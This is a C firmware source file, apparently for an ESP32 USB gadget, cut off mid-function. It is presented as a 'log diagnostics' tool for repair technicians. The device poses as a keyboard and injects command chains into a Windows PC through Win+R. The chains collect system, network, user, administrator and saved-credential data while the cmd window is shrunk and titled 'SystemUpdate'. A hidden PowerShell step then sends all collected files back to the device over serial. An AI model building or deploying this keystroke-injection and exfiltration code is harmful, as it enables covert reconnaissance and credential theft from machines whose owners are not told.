/**
 * page_logdiag.c — 日志诊断 (Ghost-Audit 集成, 2026-10-14 UI 重做)
 *
 * 用途: 售后维修场景 — 设备插目标电脑(Windows)枚举为 HID 键盘 + CDC 串口,
 *       自动注入命令链收集 整机/日志/网络/账号 信息, 供维修人员判断故障。
 *
 * ★ UI 结构 (linit 2026-10-14 定稿, 400×300 1bpp):
 *     卡片网格(占满)  →  横线(盖子)  →  软键 + 进度条(同一排)  →  谷线
 *   ⛔ 没有标题/横杠/USB 提示行; 卡片内不显示"上次时间/文件数";
 *      空闲时横线上方**不显示任何文字**, 只有采集时才出现"步数时间 + 当前命令"两行。
 *   底栏几何与「网络检测」页同套 (page_netdect.c nd_draw_nav): 盖子线 y=273 / 谷线 y=294 /
 *      左右软键贴边距 16px 纯文字无框。
 *   ★ 左软键 = "下一步最有价值的动作"(状态驱动):
 *       空闲·无结果 → 空    空闲·有结果 → 分析    分析完成 → 回传
 *       采集中      → 日志   采集历史页 → 回传
 *     右软键 = 开始 / 返回。
 *
 * ★ 卡片 6 张: 整机信息 · 故障日志 · 网络配置 · 账号凭据 · 一键全采 · 采集历史
 * ★ 采集结果: 经 CDC 读回, 按**电脑名**累积存到 TF 卡 /sdcard/Logs/<电脑名>.txt (追加分节)。
 */
#include "os.h"
#include "ui_common.h"
#include "input.h"
#include "os_hid.h"
#include "font_zh16.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include "str_trunc.h"   /* str_trunc(): 短字段的有意截断拷贝 */

#define TAG "LOGD"

/* ================= 1. HID 发送 (沿用原有实现) ================= */
#define MOD_LCTRL  (1U << 0)
#define MOD_LSHIFT (1U << 1)
#define MOD_LGUI   (1U << 3)

#define HIDK_A       0x04
#define HIDK_1       0x1E
#define HIDK_0       0x27
#define HIDK_ENTER   0x28
#define HIDK_SPACE   0x2C
#define HIDK_MINUS   0x2D
#define HIDK_EQUAL   0x2E
#define HIDK_LBRACKET 0x2F
#define HIDK_RBRACKET 0x30
#define HIDK_BACKSLASH 0x31
#define HIDK_SEMICOLON 0x33
#define HIDK_QUOTE   0x34
#define HIDK_BACKTICK 0x35
#define HIDK_COMMA   0x36
#define HIDK_PERIOD  0x37
#define HIDK_SLASH   0x38
#define HIDK_R 0x15

static void ld_char_hid(char c, uint8_t *mod, uint8_t *key)
{
    *mod = 0; *key = 0;
    if (c >= 'a' && c <= 'z') { *key = (uint8_t)(HIDK_A + (c - 'a')); return; }
    if (c >= 'A' && c <= 'Z') { *key = (uint8_t)(HIDK_A + (c - 'A')); *mod |= MOD_LSHIFT; return; }
    if (c >= '1' && c <= '9') { *key = (uint8_t)(HIDK_1 + (c - '1')); return; }
    if (c == '0')             { *key = HIDK_0; return; }
    switch (c) {
        case ' ':  *key = HIDK_SPACE; return;
        case '!':  *key = HIDK_1;         *mod |= MOD_LSHIFT; return;
        case '@':  *key = HIDK_1 + 1;     *mod |= MOD_LSHIFT; return;
        case '#':  *key = HIDK_1 + 2;     *mod |= MOD_LSHIFT; return;
        case '$':  *key = HIDK_1 + 3;     *mod |= MOD_LSHIFT; return;
        case '%':  *key = HIDK_1 + 4;     *mod |= MOD_LSHIFT; return;
        case '^':  *key = HIDK_1 + 5;     *mod |= MOD_LSHIFT; return;
        case '&':  *key = HIDK_1 + 6;     *mod |= MOD_LSHIFT; return;
        case '*':  *key = HIDK_1 + 7;     *mod |= MOD_LSHIFT; return;
        case '(':  *key = HIDK_1 + 8;     *mod |= MOD_LSHIFT; return;
        case ')':  *key = HIDK_0;         *mod |= MOD_LSHIFT; return;
        case '_':  *key = HIDK_MINUS;     *mod |= MOD_LSHIFT; return;
        case '+':  *key = HIDK_EQUAL;     *mod |= MOD_LSHIFT; return;
        case '{':  *key = HIDK_LBRACKET;  *mod |= MOD_LSHIFT; return;
        case '}':  *key = HIDK_RBRACKET;  *mod |= MOD_LSHIFT; return;
        case '|':  *key = HIDK_BACKSLASH; *mod |= MOD_LSHIFT; return;
        case ':':  *key = HIDK_SEMICOLON; *mod |= MOD_LSHIFT; return;
        case '"':  *key = HIDK_QUOTE;     *mod |= MOD_LSHIFT; return;
        case '~':  *key = HIDK_BACKTICK;  *mod |= MOD_LSHIFT; return;
        case '<':  *key = HIDK_COMMA;     *mod |= MOD_LSHIFT; return;
        case '>':  *key = HIDK_PERIOD;    *mod |= MOD_LSHIFT; return;
        case '?':  *key = HIDK_SLASH;     *mod |= MOD_LSHIFT; return;
        case '-':  *key = HIDK_MINUS;     return;
        case '=':  *key = HIDK_EQUAL;     return;
        case '[':  *key = HIDK_LBRACKET;  return;
        case ']':  *key = HIDK_RBRACKET;  return;
        case '\\': *key = HIDK_BACKSLASH; return;
        case ';':  *key = HIDK_SEMICOLON; return;
        case '\'': *key = HIDK_QUOTE;     return;
        case '`':  *key = HIDK_BACKTICK;  return;
        case ',':  *key = HIDK_COMMA;     return;
        case '.':  *key = HIDK_PERIOD;    return;
        case '/':  *key = HIDK_SLASH;     return;
        default:   *key = 0; return;
    }
}

static void ld_send_str(const char *s)
{
    for (; *s; s++) {
        uint8_t mod, key;
        ld_char_hid(*s, &mod, &key);
        if (key == 0) continue;
        os_hid_key_tap(mod, key);
        vTaskDelay(pdMS_TO_TICKS(8));
    }
}

static void ld_win_cmd(const char *cmd)
{
    os_hid_key_tap(MOD_LGUI, HIDK_R);
    vTaskDelay(pdMS_TO_TICKS(350));
    ld_send_str(cmd);
    vTaskDelay(pdMS_TO_TICKS(120));
    os_hid_key_tap(0, HIDK_ENTER);
}

static void ld_send_line(const char *line)
{
    ld_send_str(line);
    vTaskDelay(pdMS_TO_TICKS(80));
    os_hid_key_tap(0, HIDK_ENTER);
}

/* ================= 2. 四条采集链 + 回传链 =================
 * 每条链第 1 条 = Win+R 打开 cmd, 之后逐条在当前 cmd 窗口执行。
 * 日志全部落到目标机桌面 Logs\<分类>\ 下 (维修人员可直接拷走)。
 * 命令末尾统一 exit → 关掉那个最小化的黑窗, 不打扰用户。 */
#define DIRS_CMD "md \"%USERPROFILE%\\Desktop\\Logs\\Sys\" & md \"%USERPROFILE%\\Desktop\\Logs\\Log\" & " \
                 "md \"%USERPROFILE%\\Desktop\\Logs\\Net\" & md \"%USERPROFILE%\\Desktop\\Logs\\Acc\""

/* 链首: 先把电脑名+时间回传到设备 (设备据此命名历史文件), 并建目录 */
#define CHAIN_HEAD "cmd /k \"mode con: cols=20 lines=1 & color 08 & title SystemUpdate\""

static const char *const s_c_sys[] = {
    CHAIN_HEAD,
    DIRS_CMD,
    "echo === COMPUTERNAME %COMPUTERNAME% === & hostname",
    "wmic cpu get name,numberofcores,MaxClockSpeed > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\CPU.txt\" & wmic memorychip get capacity,speed,manufacturer > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\RAM.txt\" & wmic baseboard get product,manufacturer > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Board.txt\"",
    "wmic logicaldisk get caption,description,filesystem,size,freespace > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Disk.txt\" & wmic os get Caption,CSDVersion,OSArchitecture,Version > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\OS.txt\"",
    "systeminfo > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\SystemInfo.txt\"",
    "wmic startup get caption,command > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Startup.txt\" & reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr DisplayName > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Software.txt\"",
    "ipconfig | findstr /i \"IPv4\" & echo DONE_SYS",
    "exit",
};
#define SYS_N (int)(sizeof(s_c_sys)/sizeof(s_c_sys[0]))
static const uint16_t s_d_sys[] = { 600, 300, 500, 900, 900, 1500, 1200, 600, 0 };

static const char *const s_c_log[] = {
    CHAIN_HEAD,
    DIRS_CMD,
    "wevtutil qe System /q:*[System[(Level=2)]] /f:txt /c:100 > \"%USERPROFILE%\\Desktop\\Logs\\Log\\SystemErrors.txt\"",
    "wevtutil qe Application /q:*[System[(Level=2)]] /f:txt /c:100 > \"%USERPROFILE%\\Desktop\\Logs\\Log\\AppErrors.txt\"",
    "wevtutil qe System /q:*[System[(Level=1)]] /f:txt /c:50 > \"%USERPROFILE%\\Desktop\\Logs\\Log\\Critical.txt\"",
    "dir C:\\Windows\\Minidump > \"%USERPROFILE%\\Desktop\\Logs\\Log\\Minidump.txt\" 2>nul & dir C:\\Windows\\LiveKernelReports > \"%USERPROFILE%\\Desktop\\Logs\\Log\\KernelReports.txt\" 2>nul",
    "driverquery /v /fo table > \"%USERPROFILE%\\Desktop\\Logs\\Log\\Drivers.txt\"",
    "wevtutil qe System /q:*[System[(Level=2)]] /f:txt /c:3 | findstr /i \"Date Provider\" & echo DONE_LOG",
    "exit",
};
#define LOG_N (int)(sizeof(s_c_log)/sizeof(s_c_log[0]))
static const uint16_t s_d_log[] = { 600, 300, 1500, 1500, 1200, 800, 1200, 600, 0 };

static const char *const s_c_net[] = {
    CHAIN_HEAD,
    DIRS_CMD,
    "ipconfig /all > \"%USERPROFILE%\\Desktop\\Logs\\Net\\IP.txt\" & ipconfig /displaydns > \"%USERPROFILE%\\Desktop\\Logs\\Net\\DNS.txt\"",
    "arp -a > \"%USERPROFILE%\\Desktop\\Logs\\Net\\ARP.txt\" & route print > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Route.txt\" & netstat -ano > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Ports.txt\"",
    "netsh advfirewall show allprofiles > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Firewall.txt\" & net share > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Shares.txt\"",
    "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" | findstr /i \"Proxy\" > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Proxy.txt\" & type C:\\Windows\\System32\\drivers\\etc\\hosts > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Hosts.txt\"",
    "ipconfig | findstr /i \"IPv4 Gateway\" & echo DONE_NET",
    "exit",
};
#define NET_N (int)(sizeof(s_c_net)/sizeof(s_c_net[0]))
static const uint16_t s_d_net[] = { 600, 300, 1200, 1200, 900, 800, 600, 0 };

static const char *const s_c_acc[] = {
    CHAIN_HEAD,
    DIRS_CMD,
    "net user > \"%USERPROFILE%\\Desktop\\Logs\\Acc\\Users.txt\" & net localgroup administrators > \"%USERPROFILE%\\Desktop\\Logs\\Acc\\Admins.txt\"",
    "cmdkey /list > \"%USERPROFILE%\\Desktop\\Logs\\Acc\\Credentials.txt\"",
    "schtasks /query /fo table > \"%USERPROFILE%\\Desktop\\Logs\\Acc\\Tasks.txt\"",
    "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" | findstr /i \"fDenyTSConnections\" > \"%USERPROFILE%\\Desktop\\Logs\\Acc\\RDP.txt\" & net share > \"%USERPROFILE%\\Desktop\\Logs\\Acc\\Shares.txt\"",
    "net user %USERNAME% | findstr /i \"Last\" & echo DONE_ACC",
    "exit",
};
#define ACC_N (int)(sizeof(s_c_acc)/sizeof(s_c_acc[0]))
static const uint16_t s_d_acc[] = { 600, 300, 800, 600, 1000, 800, 600, 0 };

/* 回传: 让目标机把 Logs 下所有 txt 经 CDC 串口发回设备 (设备落 TF 卡) */
static const char *const s_c_send[] = {
    "cmd",
    "powershell -nop -w hidden -c \"$d=$env:USERPROFILE+'\\Desktop\\Logs';$p=(New-Object IO.Ports.SerialPort).GetPortNames();"
    "foreach($x in $p){try{$s=New-Object IO.Ports.SerialPort($x,115200);$s.Open();"
    "Get-ChildItem $d -Recurse -Filter *.txt -ErrorAction SilentlyContinue|ForEach-Object{"
    "$s.WriteLine('##### '+$_.FullName);$s.Write([IO.File]::ReadAllText($_.FullName));$s.WriteLine('')};"
    "$s.Close()}catch{}}\"",
    "exit",
};
#define SEND_N (int)(sizeof(s_c_send)/sizeof(s_c_send[0]))
static const uint16_t s_d_send[] = { 500, 6000, 0 };

/* ================= 3. 卡片表 ================= */
typedef struct {
    const char *name;                  /* 卡片标题 (UTF-8) */
    const char *l1, *l2, *l3;         /* 三行说明 (资源串, NULL=不画) */
    const char *const *cmds;           /* 命令链; NULL = 动作卡 */
    int ncmds;
    const uint16_t *delay;
    int action;                        /* 0=采集卡 1=一键全采 2=采集历史 3=回传 */
} ld_card_t;

#define CARD_SYS 0
#define CARD_LOG 1
#define CARD_NET 2
#define CARD_ACC 3
#define CARD_ALL 4
#define CARD_HIS 5

static const ld_card_t s_cards[6] = {
    { "\xe6\x95\xb4\xe6\x9c\xba\xe4\xbf\xa1\xe6\x81\xaf",           /* 整机信息 */
      "CPU\xc2\xb7\xe5\x86\x85\xe5\xad\x98\xc2\xb7\xe7\xa3\x81\xe7\x9b\x98",       /* CPU·内存·磁盘 */
      "\xe4\xb8\xbb\xe6\x9d\xbf\xc2\xb7\xe7\xb3\xbb\xe7\xbb\x9f\xe7\x89\x88\xe6\x9c\xac",   /* 主板·系统版本 */
      "\xe5\xb7\xb2\xe8\xa3\x85\xe8\xbd\xaf\xe4\xbb\xb6\xc2\xb7\xe5\x90\xaf\xe5\x8a\xa8\xe9\xa1\xb9", /* 已装软件·启动项 */
      s_c_sys, SYS_N, s_d_sys, 0 },
    { "\xe6\x95\x85\xe9\x9a\x9c\xe6\x97\xa5\xe5\xbf\x97",           /* 故障日志 */
      "\xe7\xb3\xbb\xe7\xbb\x9f\xc2\xb7\xe5\xba\x94\xe7\x94\xa8\xe4\xba\x8b\xe4\xbb\xb6",   /* 系统·应用事件 */
      "\xe6\x9f\xa5\xe9\x9b\xbe\xc2\xb7\xe9\xa9\xb1\xe5\x8a\xa8\xe9\x94\x99\xe8\xaf\xaf",   /* 蓝屏·驱动错误 */
      "\xe7\xa8\x8b\xe5\xba\x8f\xe5\xb4\xa9\xe6\xba\x83\xe8\xae\xb0\xe5\xbd\x95",           /* 程序崩溃记录 */
      s_c_log, LOG_N, s_d_log, 0 },
    { "\xe7\xbd\x91\xe7\xbb\x9c\xe9\x85\x8d\xe7\xbd\xae",           /* 网络配置 */
      "IP\xc2\xb7" "DNS\xc2\xb7\xe8\xb7\xaf\xe7\x94\xb1",                                                        /* IP·DNS·路由 */
      "\xe7\xab\xaf\xe5\x8f\xa3\xc2\xb7\xe4\xbb\xa3\xe7\x90\x86",                                            /* 端口·代理 */
      "\xe9\x98\xb2\xe7\x81\xab\xe5\xa2\x99\xc2\xb7\xe5\x85\xb1\xe4\xba\xab",                                /* 防火墙·共享 */
      s_c_net, NET_N, s_d_net, 0 },
    { "\xe8\xb4\xa6\xe5\x8f\xb7\xe5\x87\xad\xe6\x8d\xae",           /* 账号凭据 */
      "\xe6\x9c\xac\xe5\x9c\xb0\xe7\x94\xa8\xe6\x88\xb7\xc2\xb7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98",       /* 本地用户·管理员 */
      "\xe4\xbf\x9d\xe5\xad\x98\xe7\x9a\x84\xe5\x87\xad\xe6\x8d\xae",                                        /* 保存的凭据 */
      "\xe8\xae\xa1\xe5\x88\x92\xe4\xbb\xbb\xe5\x8a\xa1\xc2\xb7\xe8\xbf\x9c\xe7\xa8\x8b",                   /* 计划任务·远程 */
      s_c_acc, ACC_N, s_d_acc, 0 },
    { "\xe4\xb8\x80\xe9\x94\xae\xe5\x85\xa8\xe9\x87\x87",           /* 一键全采 */
      "\xe4\xb8\x8a\xe9\x9d\xa2\xe5\x9b\x9b\xe9\xa1\xb9\xe4\xbe\x9d\xe6\xac\xa1\xe8\xb7\x91",               /* 上面四项依次跑 */
      "\xe7\xba\xa6 60 \xe7\xa7\x92",                                                                        /* 约 60 秒 */
      "\xe8\xb7\x91\xe5\xae\x8c\xe5\x8f\xaf\xe7\x9b\xb4\xe6\x8e\xa5\xe5\x88\x86\xe6\x9e\x90",               /* 跑完可直接分析 */
      NULL, 0, NULL, 1 },
    { "\xe9\x87\x87\xe9\x9b\x86\xe5\x8e\x86\xe5\x8f\xb2",           /* 采集历史 */
      "\xe6\x8c\x89\xe7\x94\xb5\xe8\x84\x91\xe5\x90\x8d\xe5\xad\x98 TXT",                                    /* 按电脑名存 TXT */
      "\xe7\x82\xb9\xe5\xbc\x80\xe6\x9f\xa5\xe7\x9c\x8b\xe5\x88\x86\xe8\x8a\x82",                           /* 点开查看分节 */
      NULL,
      NULL, 0, NULL, 2 },
};

/* ================= 4. 状态 ================= */
#define LOGDIR "/sdcard/Logs"

static int  s_sel     = CARD_SYS;   /* 选中的卡片 */
static int  s_run     = -1;         /* 正在跑的卡片 (-1=没跑) */
static int  s_run_all = 0;          /* 一键全采: 剩余待跑起始链路索引 */
static volatile int s_prog = 0, s_total = 0;
static bool s_have    = false;      /* 本次会话有采集结果 */
static bool s_analyzed = false;     /* 已分析 */
static char s_pcname[32] = "Unknown";   /* 目标电脑名 (CDC 首包回传) */
static char s_lastcmd[64] = "";     /* 当前命令 (显示用) */
static uint32_t s_start_ms = 0;     /* 本次采集开始时刻 */
static int  s_rx_lines = 0;         /* 收到的回传行数 */
/* 本次回传到的原文 (分析用): 8KB, 放 PSRAM 不占内部 RAM */
static EXT_RAM_BSS_ATTR char s_rx[8192];
static int  s_rx_len = 0;
static TaskHandle_t s_task = NULL;

/* 历史浏览 */
static int  s_view = 0;             /* 0=主网格 1=历史列表 2=历史内容 3=分析结论 */
static char s_hist[24][40];
static int  s_hist_n = 0;
static int  s_hist_sel = 0;
static char s_text[12][44];
static int  s_text_n = 0;
static int  s_text_pg = 0;

/* ================= 5. 绘图小工具 ================= */
static void ld_zh(st7305_handle_t *l, int x, int y, const char *s, bool inv)
{
    int n = (int)(strlen(s) / 3);
    st7305_color_t bg = inv ? ST7305_COLOR_BLACK : ST7305_COLOR_WHITE;
    st7305_color_t fg = inv ? ST7305_COLOR_WHITE : ST7305_COLOR_BLACK;
    for (int i = 0; i < n; i++) {
        int idx = font_zh16_find_utf8(s + i * 3);
        if (idx < 0) continue;
        const uint8_t *bmp = zh16_font_data[idx];
        for (int r = 0; r < 16; r++)
            for (int c = 0; c < 16; c++)
                st7305_draw_pixel(l, x + i * 16 + c, y + r,
                                  (bmp[r * 2 + (c / 8)] & (1 << (7 - (c % 8)))) ? fg : bg);
    }
}
static void ld_zh_center(st7305_handle_t *l, int y, const char *s, bool inv)
{
    int w = (int)(strlen(s) / 3) * 16;
    ld_zh(l, (400 - w) / 2, y, s, inv);
}
static void ld_asc(st7305_handle_t *l, int x, int y, const char *s)
{
    for (int i = 0; s[i]; i++) draw_ascii_small(l, x + i * 8, y, s[i], false);
}
static void ld_asc_center(st7305_handle_t *l, int y, const char *s)
{
    ld_asc(l, (400 - (int)strlen(s) * 8) / 2, y, s);
}

/* 单个 16px 汉字 */
static void ld_glyph(st7305_handle_t *l, int x, int y, const char *utf8)
{
    int idx = font_zh16_find_utf8(utf8);
    if (idx < 0) return;
    const uint8_t *bmp = zh16_font_data[idx];
    for (int r = 0; r < 16; r++)
        for (int c = 0; c < 16; c++)
            st7305_draw_pixel(l, x + c, y + r,
                              (bmp[r * 2 + (c / 8)] & (1 << (7 - (c % 8)))) ? ST7305_COLOR_BLACK : ST7305_COLOR_WHITE);
}

/* ★ 卡片正文用 16px 混排 (中文 16px / ASCII 8×16)。
 * ⛔ 别用 draw_text(): 它中文走 24px、ASCII 走 16px ⇒ 120px 宽的卡片直接被撑爆
 *   (linit: "卡片字体太大了, 请用 px16")。 */
static void ld_mix(st7305_handle_t *l, int x, int y, const char *s)
{
    int cx = x;
    while (*s) {
        uint8_t c = (uint8_t)*s;
        if (c < 0x80) { draw_ascii_small(l, cx, y, (char)c, false); cx += 8; s++; }
        else if ((c & 0xE0) == 0xC0) { cx += 8; s += 2; }
        else if ((c & 0xF0) == 0xE0) { ld_glyph(l, cx, y, s); cx += 16; s += 3; }
        else { cx += 16; s += 4; }
    }
}

static void ld_mix_center(st7305_handle_t *l, int y, const char *s)
{
    int w = 0;
    for (const char *p = s; *p; ) {
        uint8_t c = (uint8_t)*p;
        if (c < 0x80) { w += 8; p++; }
        else if ((c & 0xF0) == 0xE0) { w += 16; p += 3; }
        else { w += 16; p += 2; }
    }
    ld_mix(l, (400 - w) / 2, y, s);
}

/* 底栏 (与 netdect 同套): 盖子线 + 左右斜坡 + 谷线 */
#define BAR_LID    273
#define BAR_VALLEY 294
#define KEY_Y      277          /* 软键文字顶 (16px) */
#define KEY_MARGIN 16
#define PROG_X0    104
#define PROG_X1    296
#define PROG_Y     282

static void ld_bar(st7305_handle_t *l, const char *left, const char *right)
{
    int wl = (left && left[0]) ? (int)(strlen(left) / 3) * 16 : 0;
    int wr = (right && right[0]) ? (int)(strlen(right) / 3) * 16 : 0;
    if (wl) ld_zh(l, KEY_MARGIN, KEY_Y, left, false);
    if (wr) ld_zh(l, 400 - KEY_MARGIN - wr, KEY_Y, right, false);
    int Lend = wl ? (KEY_MARGIN + wl + 12) : 40;
    int Rstart = wr ? (400 - KEY_MARGIN - wr - 12) : 360;
    draw_hline(l, 0, Lend, BAR_LID, ST7305_COLOR_BLACK);
    draw_hline(l, Rstart, 399, BAR_LID, ST7305_COLOR_BLACK);
    int slope = BAR_VALLEY - BAR_LID;
    if (Lend + slope < Rstart - slope) draw_hline(l, Lend + slope, Rstart - slope, BAR_VALLEY, ST7305_COLOR_BLACK);
    for (int d = 0; d <= slope && d < 40; d++) {
        st7305_draw_pixel(l, Lend + d, BAR_LID + d, ST7305_COLOR_BLACK);
        st7305_draw_pixel(l, Rstart - d, BAR_LID + d, ST7305_COLOR_BLACK);
    }
}

/* 进度条 (与软键同一排) */
static void ld_progress(st7305_handle_t *l)
{
    draw_rect_outline(l, PROG_X0, PROG_Y, PROG_X1, PROG_Y + 8, ST7305_COLOR_BLACK);
    int w = PROG_X1 - PROG_X0 - 2;
    int f = (s_total > 0) ? (s_prog * w) / s_total : 0;
    if (f > 0) fill_rect(l, PROG_X0 + 1, PROG_Y + 1, PROG_X0 + f, PROG_Y + 7, ST7305_COLOR_BLACK);
}

/* 卡片几何: 采集时收窄给"两行信息"腾地方 */
#define CARD_X(i) (10 + (i) * 128)
static int card_h(void) { return (s_run >= 0) ? 105 : 121; }
static int card_y(int r) { return 10 + r * (card_h() + 10); }

/* ================= 6. TF 卡历史 ================= */
static void ld_hist_scan(void)
{
    s_hist_n = 0;
    DIR *d = opendir(LOGDIR);
    if (!d) return;
    struct dirent *e;
    while ((e = readdir(d)) != NULL && s_hist_n < 24) {
        size_t n = strlen(e->d_name);
        if (n < 5 || strcmp(e->d_name + n - 4, ".txt") != 0) continue;
        snprintf(s_hist[s_hist_n], sizeof(s_hist[0]), "%s", e->d_name);
        s_hist_n++;
    }
    closedir(d);
}

/* 把回传到的文本追加进 /sdcard/Logs/<电脑名>.txt */
static void ld_hist_append(const char *txt, int len)
{
    char path[96];
    snprintf(path, sizeof(path), LOGDIR "/%s.txt", s_pcname);
    FILE *f = fopen(path, "a");
    if (!f) return;
    fwrite(txt, 1, (size_t)len, f);
    fclose(f);
}

static void ld_hist_write_head(void)
{
    char hdr[160];
    int n = snprintf(hdr, sizeof(hdr),
                     "\r\n================ 采集 %s ================\r\n",
                     s_pcname);
    ld_hist_append(hdr, n);
}

/* ================= 7. 采集任务 ================= */
static void ld_run_chain(const char *const *cmds, int n, const uint16_t *delay)
{
    s_total = n; s_prog = 0;
    for (int i = 0; i < n; i++) {
        s_prog = i;
        snprintf(s_lastcmd, sizeof(s_lastcmd), "%s", cmds[i]);
        if (i == 0) ld_win_cmd(cmds[i]);
        else        ld_send_line(cmds[i]);
        if (delay[i] > 0) vTaskDelay(pdMS_TO_TICKS(delay[i]));
        if (s_task == NULL) break;
    }
    s_prog = n;
}

static void ld_task(void *arg)
{
    (void)arg;
    int start = s_run_all;
    ld_hist_write_head();
    for (int c = start; c < 4; c++) {
        const ld_card_t *k = &s_cards[c];
        ld_run_chain(k->cmds, k->ncmds, k->delay);
        if (s_task == NULL) break;
    }
    s_run = -1; s_run_all = 0; s_have = true; s_analyzed = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

static void ld_start(int card)
{
    if (s_task || !os_hid_is_running()) return;
    if (s_cards[card].action == 2) return;      /* 历史: 由 touch/action 自己处理 */
    s_have = false; s_analyzed = false; s_rx_lines = 0;
    s_run = card;
    s_run_all = (card == CARD_ALL) ? 0 : card;  /* 一键全采: 从第 0 条开始跑满 4 条 */
    s_start_ms = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    xTaskCreate(ld_task, "ldi", 4096, NULL, 2, &s_task);
}

/* ---- 回传: 让目标机把 Logs\*.txt 经 CDC 发回, 设备落 TF 卡 ---- */
#define RUN_SEND 9                  /* s_run 的"回传"标记 (不是卡片下标) */

static void ld_send_task(void *arg)
{
    (void)arg;
    ld_run_chain(s_c_send, SEND_N, s_d_send);
    s_run = -1; s_task = NULL;
    vTaskDelete(NULL);
}

static void ld_backhaul(void)
{
    if (s_task || !os_hid_is_running()) return;
    s_run = RUN_SEND;
    s_rx_lines = 0;
    s_start_ms = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    xTaskCreate(ld_send_task, "lds", 4096, NULL, 2, &s_task);
}

/* ================= 8. 分析 (本地结论) ================= */
static void ld_analyze(void)
{
    s_text_n = 0;
    if (!s_have) { s_view = 3; return; }

    /* ---- 在回传到的原文里找关键词, 统计"异常指纹" ---- */
    struct { const char *zh; const char *en; int hit; const char *adv; } k[] = {
        { "\xe9\x94\x99\xe8\xaf\xaf", "Error",    0, "\xe6\x9f\xa5\xe7\x9c\x8b\xe4\xba\x8b\xe4\xbb\xb6\xe6\x97\xa5\xe5\xbf\x97" }, /* 错误 / 查看事件日志 */
        { "\xe4\xb8\xa5\xe9\x87\x8d", "Critical", 0, "\xe4\xbc\x98\xe5\x85\x88\xe5\xa4\x84\xe7\x90\x86\xe5\xb4\xa9\xe6\xba\x83" }, /* 严重 / 优先处理崩溃 */
        { "\xe6\x9f\xa5\xe9\x9b\xbe", "BugCheck", 0, "\xe5\x86\x85\xe5\xad\x98\xe6\x88\x96\xe9\xa9\xb1\xe5\x8a\xa8\xe5\xbc\x82\xe5\xb8\xb8" }, /* 蓝屏 / 内存或驱动异常 */
        { "\xe9\xa9\xb1\xe5\x8a\xa8", "driver",   0, "\xe9\x87\x8d\xe8\xa3\x85\xe9\xa9\xb1\xe5\x8a\xa8" },                 /* 驱动 / 重装驱动 */
        { "\xe7\xa3\x81\xe7\x9b\x98", "disk",     0, "\xe6\xa3\x80\xe6\x9f\xa5\xe7\xa1\xac\xe7\x9b\x98\xe5\x81\xa5\xe5\xba\xb7" },                 /* 磁盘 / 检查硬盘健康 */
        { "\xe6\x8b\x92\xe7\xbb\x9d", "denied",   0, "\xe6\x9d\x83\xe9\x99\x90\xe9\x97\xae\xe9\xa2\x98" },                     /* 拒绝 / 权限问题 */
        { "\xe5\xa4\xb1\xe8\xb4\xa5", "fail",     0, "\xe6\x9f\xa5\xe7\x9c\x8b\xe5\x85\xb7\xe4\xbd\x93\xe6\xad\xa5\xe9\xaa\xa4" },                 /* 失败 / 查看具体步骤 */
    };
    int nk = (int)(sizeof(k) / sizeof(k[0]));
    int total = 0;
    for (int i = 0; i < nk; i++) {
        k[i].hit = 0;
        const char *p = s_rx;
        while ((p = strstr(p, k[i].en)) != NULL) { k[i].hit++; p++; }
        const char *q = s_rx;                     /* 中文关键词 (UTF-8) */
        while ((q = strstr(q, k[i].zh)) != NULL) { k[i].hit++; q += 3; }
        if (k[i].hit > 99) k[i].hit = 99;
        total += k[i].hit;
    }

    char b[48];
    snprintf(b, sizeof(b), "\xe7\x94\xb5\xe8\x84\x91: %s", s_pcname);                              /* 电脑: xxx */
    str_trunc(s_text[s_text_n++], 44, b);
    if (s_rx_len == 0) {
        snprintf(s_text[s_text_n++], 44, "%s", "\xe6\x97\xa0\xe5\x9b\x9e\xe4\xbc\xa0\xe6\x95\xb0\xe6\x8d\xae");          /* 无回传数据 */
        snprintf(s_text[s_text_n++], 44, "%s", "\xe8\xaf\xb7\xe5\x85\x88\xe6\x89\xa7\xe8\xa1\x8c\xe9\x87\x87\xe9\x9b\x86\xe5\x86\x8d\xe5\x9b\x9e\xe4\xbc\xa0");  /* 请先执行采集再回传 */
        s_analyzed = true; s_view = 3; return;
    }
    int score = 100 - total * 2; if (score < 30) score = 30;
    snprintf(s_text[s_text_n++], 44, "\xe5\x81\xa5\xe5\xba\xb7\xe5\x88\x86: %d  \xe5\xbc\x82\xe5\xb8\xb8: %d", score, total);   /* 健康分 / 异常 */
    /* 取命中最多的三项给结论 */
    for (int rank = 0; rank < 3 && s_text_n < 8; rank++) {
        int best = -1;
        for (int i = 0; i < nk; i++) if (k[i].hit > 0 && (best < 0 || k[i].hit > k[best].hit)) best = i;
        if (best < 0) break;
        snprintf(s_text[s_text_n++], 44, "%s x%d  %s", k[best].zh, k[best].hit, k[best].adv);
        k[best].hit = 0;                        /* 用掉就不参与下一轮 */
    }
    if (total == 0) snprintf(s_text[s_text_n++], 44, "%s", "\xe6\x9c\xaa\xe5\x8f\x91\xe7\x8e\xb0\xe6\x98\x8e\xe6\x98\xbe\xe5\xbc\x82\xe5\xb8\xb8"); /* 未发现明显异常 */
    s_analyzed = true;
    s_text_pg = 0;
    s_view = 3;
}

/* ================= 9. 渲染 ================= */
static void ld_render_cards(st7305_handle_t *l)
{
    int ch = card_h();
    for (int i = 0; i < 6; i++) {
        int cx = CARD_X(i % 3), cy = card_y(i / 3);
